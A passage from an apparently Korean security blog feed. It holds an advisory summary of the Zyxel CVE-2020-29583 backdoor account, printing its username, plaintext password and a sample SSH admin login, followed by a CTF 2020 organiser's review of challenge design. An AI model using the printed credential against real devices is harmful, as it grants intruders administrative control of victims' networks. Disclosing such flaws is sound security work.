&#xD558;&#xB4DC; &#xCF54;&#xB529;&#xB41C; undocumented account(FTP&#xB97C; &#xD1B5;&#xD55C; &#xC790;&#xB3D9; &#xD38C;&#xC6E8;&#xC5B4; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC81C;&#xACF5;&#xC744; &#xC704;&#xD55C; &#xACC4;&#xC815;)&#xB97C; &#xD1B5;&#xD574; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xB85C;&#xADF8;&#xC778;&#xD558;&#xACE0; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC7A5;&#xBE44;&#xB97C; &#xC190;&#xC0C1;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xD328;&#xCE58;&#xB97C; &#xBC1C;&#xD45C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; CVE-2020-29583&#xC73C;&#xB85C; undocumented account&#xC778; <code>zyfwp</code>&#xC640; &#xC218;&#xC815;&#xD560; &#xC218; &#xC5C6;&#xB294; &#xBE44;&#xBC00;&#xBC88;&#xD638; <code>PrOw! aN_fXp</code>&#xAC00; &#xD3C9;&#xBB38;&#xC73C;&#xB85C; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70; &#xD574;&#xB2F9; &#xACC4;&#xC815;&#xC744; &#xD1B5;&#xD574; &#xD574;&#xCEE4;&#xAC00; SSH &#xC11C;&#xBC84;&#xB098; &#xC6F9; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC5D0; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs routeros">$ ssh zyfwp@192.168.1.252Password: Pr*******XpRouter&gt; show<span class="hljs-built_in"> users </span>current<span class="hljs-literal">No</span>: 1  Name: zyfwp  Type: admin(<span class="hljs-built_in">..</span>.)Router&gt;</code></pre><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD574; &#xD574;&#xCEE4;&#xB294; &#xBC29;&#xD654;&#xBCBD;&#xC758; &#xC124;&#xC815;&#xC744; &#xC870;&#xC791;&#xD558;&#xC5EC; &#xD2B9;&#xC815; &#xD2B8;&#xB798;&#xD53D;&#xC744; &#xD5C8;&#xC6A9;&#xD558;&#xAC70;&#xB098; &#xB9C9;&#xC744; &#xC218; &#xC788;&#xACE0;, &#xD2B8;&#xB798;&#xD53D;&#xC744; &#xAC00;&#xB85C;&#xCC44;&#xAC70;&#xB098; VPN &#xACC4;&#xC815;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xC5EC; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0; &#xB300;&#xD55C; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.eyecontrol.nl/blog/undocumented-user-account-in-zyxel-products.html">https://www.eyecontrol.nl/blog/undocumented-user-account-in-zyxel-products.html</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>backdoor</tag>
      
      <tag>idioth</tag>
      
      <tag>zyxel</tag>
      
      <tag>undocumented account</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Daily-Life] 크리스마스 CTF 2020 운영 후기</title>
    <link href="/2021/01/03/idioth/christmasctf2020-review/"/>
    <url>/2021/01/03/idioth/christmasctf2020-review/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xC0AC;&#xAC74;&#xC758;-&#xC804;&#xB9D0;"><a href="#&#xC0AC;&#xAC74;&#xC758;-&#xC804;&#xB9D0;" class="headerlink" title="&#xC0AC;&#xAC74;&#xC758; &#xC804;&#xB9D0;"></a>&#xC0AC;&#xAC74;&#xC758; &#xC804;&#xB9D0;</h1><p>&#xB9E4;&#xB144; &#xD06C;&#xB9AC;&#xC2A4;&#xB9C8;&#xC2A4;&#xC5D0; &#xC774;&#xBCA4;&#xD2B8; &#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xC5F4;&#xB9AC;&#xB294; &#xC194;&#xB85C;&#xB4E4;&#xC744; &#xC704;&#xD55C;(?) &#xD06C;&#xB9AC;&#xC2A4;&#xB9C8;&#xC2A4; CTF&#xC758; &#xC8FC;&#xCD5C;&#xB97C; &#xC774;&#xBC88;&#xC5D0; &#xC138;&#xC885;&#xB300;&#xD559;&#xAD50; &#xC815;&#xBCF4;&#xBCF4;&#xC548; &#xB3D9;&#xC544;&#xB9AC; SSG&#xC640; &#xD568;&#xAED8; &#xB9E1;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC2E4; &#xC6B0;&#xB9AC;&#xAC00; &#xBB38;&#xC81C;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC57C; &#xB41C;&#xB2E4;&#xB294; &#xC774;&#xC57C;&#xAE30;&#xB3C4; &#xAC11;&#xC790;&#xAE30; &#xB4E4;&#xC5C8;&#xC8E0;. Fabu1ous&#xB294; &#xB9E1;&#xAC8C; &#xB41C; &#xACFC;&#xC815;&#xC744; &#xB208; &#xC55E;&#xC5D0;&#xC11C; &#xBAA9;&#xACA9;&#xD588;&#xC73C;&#xB098; idioth&#xACFC; L0ch&#xB294; &#xD1B5;&#xBCF4;&#xB97C; &#xBC1B;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026;</p><blockquote><p>??? : &#xD06C;&#xB9AC;&#xC2A4;&#xB9C8;&#xC2A4; &#xB54C; &#xBB50;&#xD558;&#xB0D0;<br>idioth : &#xB370;&#xC774;&#xD2B8;&#xC694;<br>??? : &#xC5EC;&#xC790; &#xCE5C;&#xAD6C; &#xC5C6;&#xC796;&#xC544;<br>idioth : &#xADF8;&#xB54C;&#xB294; &#xC788;&#xACA0;&#xC8E0;<br>??? : &#xBB38;&#xC81C;&#xB098; &#xB9CC;&#xB4E4;&#xC5B4;&#xB77C;<br>L0ch : &#xC804; &#xC788;&#xB294;&#xB370;&#xC6A9; &#x314E;&#x314E;<br>??? : &#xC54C; &#xBC14; &#xC544;&#xB2C8;&#xACE0;</p></blockquote><p><img src="/2021/01/03/idioth/christmasctf2020-review/image0.png" alt></p><p>&#xBD88;&#xC548;&#xD55C; &#xC9C1;&#xAC10;&#xC740; &#xC5B8;&#xC81C;&#xB098; &#xC633;&#xC2B5;&#xB2C8;&#xB2E4;. &#x2018;&#xC6B0;&#xB9AC; &#xBB38;&#xC81C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC57C; &#xB3FC;&#x2019;&#xB97C; &#xB4E3;&#xC790;&#xB9C8;&#xC790; &#xC9C1;&#xAC10;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544; &#xD06C;&#xB9AC;&#xC2A4;&#xB9C8;&#xC2A4; CTF&#xAD6C;&#xB098;&#x2026; &#xCC98;&#xC74C;&#xC5D4; &#xC778;&#xB2F9; &#xB450; &#xBB38;&#xC81C;&#xC529; &#xB9CC;&#xB4E4;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC5EC;&#xAE30;&#xC11C; &#xC0AC;&#xAC74;&#xC774; &#xD558;&#xB098; &#xBC8C;&#xC5B4;&#xC9C0;&#xB294;&#xB370;&#x2026;</p><p>&#xB370;&#xC774;&#xD130; &#xCC4C;&#xB9B0;&#xC9C0;&#xB97C; &#xB098;&#xAC00;&#xAE30;&#xB85C; &#xD588;&#xC5C8;&#xB294;&#xB370; &#xD300;&#xC7A5; &#xB140;&#xC11D;&#xC774; &#xBD84;&#xC57C;&#xB97C; &#xCC29;&#xAC01;&#xD574;&#xC11C; &#xC2E0;&#xCCAD;&#xC744; &#xBABB;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB85C; &#xC778;&#xD574; &#xAC01; 3&#xBB38;&#xC81C;&#xB97C; &#xB9CC;&#xB4E4;&#xAE30;&#xB85C;&#x2026;&#x314B;&#x314B;&#x314B;&#x314B;</p><blockquote><p>idioth : &#xC598;&#xB4E4;&#xC544; &#xC6B0;&#xB9AC; &#xC138; &#xBB38;&#xC81C;&#xC529; &#xB9CC;&#xB4E4;&#xAE30;&#xB85C; &#xD588;&#xC5B4; &#x314E;&#x314E;<br>L0ch, Fabu1ous : ???<br>idioth : &#xB370;&#xC774;&#xD130; &#xCC4C;&#xB9B0;&#xC9C0; &#xC2E0;&#xCCAD; &#xBABB;&#xD568; &#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;</p></blockquote><p><img src="/2021/01/03/idioth/christmasctf2020-review/image1.png" alt></p><p>&#xCC98;&#xC74C;&#xC5D0; &#xB9CC;&#xB4E4;&#xAE30;&#xB85C; &#xD55C; &#xBB38;&#xC81C;&#xC5D0; &#xB300;&#xD55C; &#xBC84;&#xADF8; &#xD074;&#xB798;&#xC2A4;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;&#xB9CC;&#x2026;</p><ul><li>idioth<ul><li>rev : custom packer</li><li>web : cve-2020-9484 tomcat rce</li><li>misc : snake</li></ul></li><li>L0ch<ul><li>pwn : Windows pwnable uaf</li><li>pwn : Linux pwnable type confusion</li><li>rev : obfuscate</li></ul></li><li>Fabu1ous<ul><li>pwn : angr challenge</li><li>pwn : uninit stack</li><li>misc : &#xBBF8;&#xC815;</li></ul></li></ul><p>&#xC5EC;&#xB7EC; &#xAC00;&#xC9C0; &#xC774;&#xC720;&#xB85C; &#xB9CE;&#xC774; &#xBC14;&#xB00C;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xCF54;&#xB85C;&#xB098; &#xB54C;&#xBB38;&#xC5D0; &#xAC11;&#xC790;&#xAE30; &#xD559;&#xAE30;&#xAC00; 1&#xC8FC;&#xC77C; &#xB2F9;&#xACA8;&#xC9C0;&#xBA74;&#xC11C; 11&#xC6D4;&#xACFC; 12&#xC6D4; &#xCD08;&#xAC00; &#xD1B5;&#xC9F8;&#xB85C; &#xBC14;&#xBE60;&#xC9C8; &#xC904;&#xC740; &#xADF8;&#xB4E4;&#xC740; &#xBAB0;&#xB790;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026;</p><p>&#xD559;&#xAE30;&#xAC00; &#xB05D;&#xB09C; &#xD6C4; &#xADF8;&#xB4E4;&#xC740; &#xB7A9;&#xC2E4;&#xC5D0; &#xAC07;&#xD600;&#xC11C; &#xADFC; 1&#xC8FC;&#xC77C;&#xC744; &#xBC24;&#xC0C8;&#xBA70; &#xBB38;&#xC81C;&#xB97C; &#xB9CC;&#xB4E4;&#xAE30;&#xC5D0; &#xBC15;&#xCC28;&#xB97C; &#xAC00;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image2.png" alt></p><p>&#xB300;&#xD68C; &#xC804;&#xB0A0; &#xADF8;&#xB4E4;&#xC758; &#xBAA8;&#xC2B5;</p><h1 id="idioth"><a href="#idioth" class="headerlink" title="idioth"></a>idioth</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;. idioth&#xC785;&#xB2C8;&#xB2E4;. &#xBB50;&#x2026; &#xCC98;&#xC74C;&#xC5D0; &#xB300;&#xD68C;&#xB97C; &#xD55C;&#xB2E4; &#xD588;&#xC744; &#xB54C;&#xB294; &#xC880; &#xB9CE;&#xC774; &#xB2F9;&#xD669;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC77C;&#xB2E8; 5&#xC6D4; &#xC911;&#xC21C;&#xC5D0; &#xC18C;&#xC9D1; &#xD574;&#xC81C;&#xD558;&#xACE0; &#xC774;&#xC81C; &#xB9C9; &#xB2E4;&#xC2DC; &#xACF5;&#xBD80;&#xB97C; &#xC2DC;&#xC791;&#xD55C; &#xCC38;&#xC774;&#xB77C;&#xC11C;&#x2026; &#xCD9C;&#xC81C;&#xD558;&#xAE30; &#xC804;&#xAE4C;&#xC9C0; CTF&#xB97C; 2&#xAC1C; &#xC815;&#xB3C4; &#xB098;&#xAC14;&#xB294;&#xB370; &#xBB38;&#xC81C;&#xB97C; baby-rev &#xC815;&#xB3C4;&#xBC16;&#xC5D0; &#xBABB; &#xD480;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB54;&#xAC00; &#xC880; &#xB9CE;&#xC774; &#xBC14;&#xB010; &#xAC83; &#xAC19;&#xB354;&#xB77C;&#xACE0;&#xC694;. &#xD3EC;&#xB108;&#xBE14;&#xC744; &#xB0B4;&#xAE30;&#xC5D0;&#xB294; &#xAE30;&#xC5B5;&#xB3C4; &#xC5B4;&#xB834;&#xD48B;&#xD558;&#xACE0;&#x2026;</p><p>&#xC554;&#xD638; &#xACF5;&#xBD80;&#xB97C; &#xD574;&#xC57C;&#xACA0;&#xB2E4;&#xB294; &#xC0DD;&#xAC01;&#xC740; &#xB298; &#xD558;&#xACE0; &#xC788;&#xC5C8;&#xB294;&#xB370; &#xCD5C;&#xADFC;&#xC5D0; &#xC5B4;&#xB5A4; &#xBB38;&#xC81C;&#xB4E4;&#xC774; &#xB9CE;&#xC740;&#xAC00; &#xBD24;&#xB354;&#xB2C8; &#xC554;&#xD638;&#xB791; &#xC811;&#xBAA9;&#xC744; &#xB9CE;&#xC774; &#xC2DC;&#xCF1C;&#xC11C; &#xB098;&#xC624;&#xB354;&#xB77C;&#xACE0;&#xC694;. &#xC77C;&#xB2E8; &#xC554;&#xD638;&#xB294; &#xB0B4;&#xAC00; &#xD560; &#xC904; &#xBAA8;&#xB974;&#xB2C8; &#xD328;&#xC2A4;&#x2026; &#xADF8;&#xB7FC; &#xBB50; &#xB9CC;&#xB4E4;&#xC9C0;? &#xD558;&#xB2E4;&#xAC00; &#xBCF5;&#xBB34; &#xC911;&#xC5D0; &#xD588;&#xB358; Custom Packer &#xC2A4;&#xD130;&#xB514;&#xAC00; &#xB5A0;&#xC62C;&#xB790;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image3.png" alt></p><p>&#xC544;! &#xC774;&#xAC70;&#xB2E4;! &#xD328;&#xCEE4; &#xB531; &#xB300;!</p><p>&#xBB38;&#xC81C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC57C; &#xB41C;&#xB2E4;&#xB294; &#xC18C;&#xB9AC;&#xB97C; &#xB4E4;&#xC740; &#xD6C4; &#xC8FC;&#xC81C;&#xB97C; &#xB300;&#xCDA9; &#xC815;&#xD55C; &#xD6C4; &#xBC14;&#xB85C; &#xB2E4;&#xC74C; &#xB2EC;&#xBD80;&#xD130; &#xD328;&#xCEE4; &#xAC1C;&#xBC1C;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC14;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC77C;&#xB2E8; &#xD328;&#xCEE4; &#xAD00;&#xB828;&#xB41C; &#xBB38;&#xC81C;&#xAC00; &#xB098;&#xC624;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;&#xB294; &#xAC83;&#xC740;&#x2026; &#xB2E4;&#xB4E4; &#xC544;&#xC2DC;&#xC8E0;? (&#x314E;&#x314E;)</p><ol><li>64&#xBE44;&#xD2B8;&#xB85C; &#xB9CC;&#xB4E4;&#xC790;</li><li>&#xC5B4; &#xB0B4;&#xAC00; &#xADF8;&#xB54C; &#xC2A4;&#xD130;&#xB514;&#xD588;&#xB358; &#xAC74; 32&#xBE44;&#xD2B8;&#xB124;?</li><li>&#xB108;&#xBB34; &#xC61B;&#xB0A0; &#xAC70;&#xB124;? &#xAC8C;&#xB2E4;&#xAC00; &#xAC8C;&#xC2DC;&#xAE00;&#xB3C4; &#xC0AC;&#xB77C;&#xC84C;&#xB124;?</li><li>&#x2026;github&#xC5D0; &#xC62C;&#xB77C;&#xC640;&#xC788;&#xB294; &#xAC78; &#xBCF4;&#xACE0; &#xC5B4;&#xB5A4; &#xD750;&#xB984;&#xC73C;&#xB85C; &#xAC00;&#xBA74; &#xC88B;&#xC740; &#xC9C0; &#xBCF4;&#xC790;</li></ol><p>&#xADF8;&#xB9AC;&#xACE0; &#xC5F4;&#xC2EC;&#xD788; &#xC5F4;&#xC2EC;&#xD788; &#xD55C; &#xB2EC;&#xC5D0; &#xAC78;&#xCCD0;&#xC11C; &#xC644;&#xC131;&#xC744; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC5ED;&#xC2DC; &#xB09C; &#xD55C;&#xB2E4;&#xBA74; &#xD558;&#xB294; &#xB0A8;&#xC790;! &#xD558;&#xC9C0;&#xB9CC;&#x2026;</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image4.png" alt></p><p>&#xCF54;&#xB4DC;&#xB97C; &#xACC4;&#xC18D; &#xBCF4;&#xB294;&#xB370;&#xB3C4; &#xB3C4;&#xB300;&#xCCB4; &#xC5B4;&#xB514;&#xAC00; &#xBB38;&#xC81C;&#xC778;&#xC9C0; &#xBAA8;&#xB974;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xC544; &#xC2DC;&#xAC04;&#xC774; &#xC5C6;&#xB294;&#xB370; &#xC774;&#xC81C; &#xACFC;&#xC81C; &#xD3ED;&#xD48D;&#xC774; &#xBAB0;&#xB824;&#xC624;&#xACE0; &#xC788;&#xB294;&#xB370;&#x2026; &#xC5B4;&#xB5A1;&#xD558;&#xC9C0;?</p><p>&#xC77C;&#xB2E8; tomcat&#xBD80;&#xD130; &#xB9CC;&#xB4E4;&#xC790;&#x2026; tomcat &#xC790;&#xCCB4;&#xC5D0; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xC73C;&#xB2C8; &#xC6F9; &#xC0AC;&#xC774;&#xD2B8; &#xAD6C;&#xD604;&#xD558;&#xACE0; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xAE30;&#xB2A5; &#xAD6C;&#xD604;&#xB9CC; &#xD558;&#xBA74; &#xB418;&#xB2C8;&#xAE4C; &#xAE08;&#xBC29; &#xD558;&#xACA0;&#xC9C0;? &#xC6F9; &#xD558;&#xB294; &#xC560;&#xB4E4;&#xC774; &#xB3C4;&#xC640;&#xC900;&#xB314;&#xC5B4;.</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image5.png" alt></p><p>&#xC751; &#xADF8;&#xB7F0;&#xAC70; &#xC5C6;&#xC5B4;~ &#xC6F9; &#xB9CC;&#xB4E4;&#xC5B4; &#xBCF8;&#xAC70;&#xB77C;&#xACE4; &#xACF5;&#xBD80; &#xCC98;&#xC74C; &#xC2DC;&#xC791;&#xD560; &#xB54C; html, php&#xC640; django&#xB97C; &#xD1B5;&#xD574; &#xB9CC;&#xB4E4;&#xC5B4; &#xBCF8; &#xAC83;&#xC774; &#xC804;&#xBD80;&#xB77C;&#xC11C; &#xB9E8; &#xB545;&#xC5D0; &#xD5E4;&#xB529;&#xC744; &#xD558;&#xBA74;&#xC11C; &#xAD6C;&#xD604;&#xC744; &#xC2DC;&#xC791;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC8C;&#xB2E4;&#xAC00; &#xD559;&#xAD50;&#xC5D0;&#xC11C; python &#xD559;&#xBD80; &#xC218;&#xC5C5; &#xC870;&#xAD50;&#xB3C4; &#xC9C4;&#xD589;&#xD574;&#xC11C; &#xBB54;&#xAC00; &#xD560; &#xC77C;&#xC774; &#xAD49;&#xC7A5;&#xD788; &#xB9CE;&#xC558;&#xC8E0;(&#xD551;&#xACC4;&#xC57C;)</p><blockquote><p>&#xAE30;&#xC0C1; - &#xD558;&#xB8E8; &#xD55C; &#xC904; - &#xC870;&#xAD50; - &#xACFC;&#xC81C; - (&#xBE14;&#xB85C;&#xADF8; &#xAE00;) - &#xBB38;&#xC81C; &#xB9CC;&#xB4E4;&#xAE30;</p></blockquote><p>&#xC704;&#xC758; &#xC21C;&#xD658;&#xC744; &#xACC4;&#xC18D; &#xB3CC;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC89;&#xC73C;&#xB85C;&#xC758; &#xAD6C;&#xD604;&#xB3C4; &#xB05D;&#xB098;&#xACE0; &#xD30C;&#xC77C; &#xC5C5;&#xB85C;&#xB4DC; &#xB4F1;&#xC758; &#xAD6C;&#xD604;&#xB3C4; 11&#xC6D4; &#xB9D0;&#xC5D0; &#xB2E4; &#xB05D;&#xB0AC;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xAC00;&#xC7A5; &#xD070; &#xBB38;&#xC81C;&#xAC00; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBC84;&#xC804;&#xC740; &#xC5B4;&#xB5BB;&#xAC8C; &#xC54C;&#xB824; &#xC904; &#xAC83;&#xC774;&#xACE0; &#xC9C0;&#xAE08; &#xC0C1;&#xD0DC;&#xC5D0;&#xC120; session &#xD3F4;&#xB354;&#xC640; &#xBAA8;&#xB4E0; &#xAC83;&#xC774; &#xAC8C;&#xC2F1;&#xC774;&#xB2E4;.</p><p>&#xC5EC;&#xB7EC; &#xAC00;&#xC9C0; &#xC0AC;&#xB78C;&#xB4E4;&#xACFC; &#xC774;&#xC57C;&#xAE30;&#xB97C; &#xD574;&#xBCF8; &#xB05D;&#xC5D0; LFI&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xC744; &#xB2E4; &#xC77D;&#xC744; &#xC218; &#xC788;&#xAC8C; &#xD558;&#xB3C4;&#xB85D; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8; &#xACFC;&#xC815;&#xC5D0;&#xC11C; path traversal &#xD544;&#xD130;&#xB9C1;&#xC744; &#xAC70;&#xB294; &#xAC8C; &#xC88B;&#xC744;&#xAE4C; &#xB9D0;&#xAE4C;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB294; &#xADF8;&#xB798;&#xB3C4; <code>../</code> &#xAC19;&#xC740; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xAC70;&#xB294; &#xAC78;&#xC5B4;&#xB193;&#xB294; &#xAC8C; &#xC88B;&#xC9C0; &#xC54A;&#xC744;&#xAE4C;?&#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC744; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADFC;&#xB370; &#xC8FC;&#xBCC0;&#xC5D0;&#xC11C; &#xC5B4;&#xCC28;&#xD53C; &#xADF8;&#xB7F0; &#xAC70; &#xBCF4;&#xC774;&#xBA74; &#xC77C;&#xB2E8; &#xB54C;&#xB824; &#xB123;&#xACE0; &#xBCF4;&#xB2C8;&#xAE4C; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xAC70;&#xB294; &#xAC78;&#xC5B4;&#xB193;&#xB294; &#xAC8C; &#xC88B;&#xC544;.&#xB77C;&#xB294; &#xB9D0;&#xC744; &#xB4E3;&#xACE0; <code>gift</code> &#xBB38;&#xC81C;&#xAC00; &#xD0C4;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4; &#xB9CC;&#xB4E4;&#xC5C8;&#xC744; &#xB54C;&#xB294; &#xADF8;&#xB798;&#xB3C4; &#xC6F9; &#xCC98;&#xC74C; &#xB9CC;&#xB4E0; &#xAC83; &#xCE58;&#xACE0; &#xAD1C;&#xCC2E;&#xC740; &#xAC83; &#xAC19;&#xC740;&#xB370;?&#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC744; &#xD588;&#xC73C;&#xB098;&#x2026; &#xC800;&#xC758; &#xC624;&#xB9CC;&#xD568;&#xC774;&#xC5C8;&#xC74C;&#xC744; &#xAE68;&#xB2EC;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC73C;&#xC73C;&#x2026; &#xC800;&#xB294; &#xAC8C;&#xC2F1;&#xC744; &#xCD5C;&#xB300;&#xD55C; &#xC904;&#xC600;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD588;&#xC9C0;&#xB9CC; &#xC81C;&#xAC00; &#xB9CC;&#xB4E4;&#xC5C8;&#xB358; &#xBB38;&#xC81C;&#xB77C;&#xC11C; &#xADF8;&#xB807;&#xAC8C; &#xC0DD;&#xAC01;&#xD588;&#xB358; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4; &#x315C;&#x315C;&#x2026;</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xAC00;&#xC7A5; &#xD070; &#xBB38;&#xC81C;&#xB294; <code>gift</code> &#xD558;&#xB098; &#xB9CC;&#xB4E4;&#xC5C8;&#xB294;&#xB370; &#xB300;&#xD68C;&#xAC00; &#xC77C;&#xC8FC;&#xC77C; &#xB0A8;&#xC558;&#xB2E4;.</p><p>&#xC77C;&#xB2E8; &#xB9AC;&#xBC84;&#xC2F1; &#xBB38;&#xC81C;&#xB97C; &#xD558;&#xB098; &#xB9CC;&#xB4E4;&#xC5B4;&#xC57C;&#xC9C0;&#x2026; &#xADF8;&#xB0E5; &#xAC04;&#xB2E8;&#xD55C; &#xAC83; &#xB0B4;&#xC57C;&#xACA0;&#xB2E4;&#x2026; crackme &#xD558;&#xB098; &#xD574;&#xC57C;&#xC9C0;~ &#xD558;&#xACE0; &#xB9CC;&#xB4E4;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; &#xBB54;&#xAC00; &#xB108;&#xBB34; &#xD5C8;&#xC804;&#xD574;&#xC11C; &#xACE0;&#xBBFC;&#xC744; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544; &#xBB54;&#xAC00; &#xC5C6;&#xB098;&#x2026; &#xD558;&#xB2E4;&#xAC00; &#xB531; &#xC0DD;&#xAC01;&#xC774; &#xB0AC;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC624; &#xC774;&#xC81C; &#xB9E5;&#xB3C4; ARM&#xC73C;&#xB85C; &#xB098;&#xC624;&#xB294;&#xB370; ARM &#xB9AC;&#xBC84;&#xC2F1; &#xD560;&#xAE4C;? &#x3131;&#x3131;&#x3131;&#x3131; arm &#xC5B4;&#xC148; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xAC78;&#xB85C; &#xB0B4;&#xACE0;~ ida hexrays&#xB97C; &#xB9C9;&#xC544;&#xB193;&#xC790;. &#xC5B4;&#xCC28;&#xD53C; &#xC798;&#xD558;&#xC2DC;&#xB294; &#xBD84;&#xB4E4;&#xC740; arm&#xB3C4; &#xAE08;&#xBC29; &#xBCF4;&#xC2E4; &#xD14C;&#xACE0; &#xD558;&#xB2C8;&#xAE4C; anti-hexrays&#xB294; &#xAE08;&#xBC29; &#xD478;&#xC2DC;&#xACA0;&#xC9C0;?</p><p>ida&#xC5D0;&#xC11C;&#xB294; &#xAE68;&#xC838;&#xC11C; &#xB098;&#xC624;&#xB294;&#xB370;&#x2026; &#xC65C; ghidra&#xC5D0;&#xC11C;&#xB294; &#xC81C;&#xB300;&#xB85C; &#xB098;&#xC624;&#xB294; &#xAC78;&#xAE4C;&#x2026;?</p><p>??? : &#xC57C; &#xADF8;&#xB0E5; &#xD578;&#xB4DC; &#xB808;&#xC774;&#xB85C; &#xB0B4;&#xC790;</p><p>idioth : &#x3131; &#xC5B4;&#xCC28;&#xD53C; baby &#xC6A9;&#xC73C;&#xB85C; &#xB0B8; &#xAC70;&#xB2C8;&#xAE4C; &#xAD1C;&#xCC2E;&#xACA0;&#xC9C0;?</p><p>-<code>lock</code> &#xB05D;-</p><p>&#xC544; &#xC774;&#xC81C; snake &#xD558;&#xB098;&#xB9CC; &#xB0A8;&#xC558;&#xB124;&#xC694; &#x314E;&#x314E; misc &#xBB38;&#xC81C;&#xB77C;&#xC11C; &#xB108;&#xBB34; &#xBD80;&#xB2F4;&#xC774; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;~ &#xBC40; &#xAC8C;&#xC784; &#xC7AC;&#xBBF8;&#xB098;&#xAC8C; &#xD558;&#xB098; &#xB9CC;&#xB4E4;&#xC5B4;&#xC57C;&#xC9C0;<del>~</del>&#xD558;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xB294; &#xC640;&#xC911;&#xC5D0; &#xC55E;&#xC744; &#xBCF4;&#xB2C8;&#xAE4C; &#xC808;&#xB9DD;&#xC758; &#xAD6C;&#xB801;&#xD145;&#xC774;&#xC5D0; &#xBE60;&#xC9C4; &#xD55C; &#xB0A8;&#xC790;&#xAC00; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image6.png" alt></p><blockquote><p>L0ch : 